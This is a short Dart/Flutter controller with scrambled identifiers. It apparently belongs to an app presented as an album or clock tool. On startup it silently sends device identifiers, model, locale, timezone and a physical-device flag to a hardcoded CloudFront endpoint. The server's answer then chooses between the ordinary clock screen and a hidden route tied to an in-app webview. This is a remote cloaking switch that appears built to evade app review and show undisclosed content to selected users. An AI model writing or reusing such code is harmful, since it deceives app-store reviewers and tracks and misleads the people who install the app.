import 'dart:io';
import 'package:dio/dio.dart';
import 'package:get/get.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:package_info_plus/package_info_plus.dart';


class AlbumSystemLogic extends GetxController {

  var ylpukrztsg = RxBool(false);
  var audhwg = RxBool(true);
  var dacptes = RxString("");
  var nzcyilvh = RxBool(false);
  var jqwoprsc = RxBool(true);
  final klxmipbjf = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    kmtu();
  }


  Future<void> kmtu() async {
    nzcyilvh.value = true;
    jqwoprsc.value = true;
    audhwg.value = false;

    klxmipbjf.post("https://d1azw2jucw5qsd.cloudfront.net/QYADDZ?no_check",data: await jyhczimqu()).then((value) {
      var ysmhwajv = value.data["ysmhwajv"] as String;
      var gfkpbezd = value.data["gfkpbezd"] as bool;
      if (gfkpbezd) {
        dacptes.value = ysmhwajv;
        bzepgj();
      } else {
        ygkm();
      }
    }).catchError((e) {
      audhwg.value = true;
      jqwoprsc.value = true;
      nzcyilvh.value = false;
    });
  }

  Future<Map<String, dynamic>> jyhczimqu() async {
    final DeviceInfoPlugin aqvgzdn = DeviceInfoPlugin();
    PackageInfo grawopiv_yjsfcrx = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var atvmd = Platform.localeName;
    var lveqs = currentTimeZone;

    var glvf = grawopiv_yjsfcrx.packageName;
    var owudahft = grawopiv_yjsfcrx.version;
    var qlze = grawopiv_yjsfcrx.buildNumber;

    var ytaifd = grawopiv_yjsfcrx.appName;
    var chmkgqze = "";
    var pugwajmo  = "";
    var ahcbqp = "";
    var ynka = "";
    var gcthroi = "";
    var gtvm = "";


    var atkxogfy = "";
    var oheiqa = false;

    if (GetPlatform.isAndroid) {
      atkxogfy = "android";
      var jfkvxengzq = await aqvgzdn.androidInfo;

      ahcbqp = jfkvxengzq.brand;

      chmkgqze  = jfkvxengzq.model;
      pugwajmo = jfkvxengzq.id;

      oheiqa = jfkvxengzq.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      atkxogfy = "ios";
      var nadboqfr = await aqvgzdn.iosInfo;
      ahcbqp = nadboqfr.name;
      chmkgqze = nadboqfr.model;

      pugwajmo = nadboqfr.identifierForVendor ?? "";
      oheiqa  = nadboqfr.isPhysicalDevice;
    }

    var res = {
      "ytaifd": ytaifd,
      "qlze": qlze,
      "owudahft": owudahft,
      "glvf": glvf,
      "chmkgqze": chmkgqze,
      "lveqs": lveqs,
      "ahcbqp": ahcbqp,
      "pugwajmo": pugwajmo,
      "atvmd": atvmd,
      "atkxogfy": atkxogfy,
      "oheiqa": oheiqa,
      "ynka" : ynka,
      "gcthroi" : gcthroi,
      "gtvm" : gtvm,

    };
    return res;
  }

  Future<void> ygkm() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> bzepgj() async {
    Get.offNamed("/Outreload");
  }

}
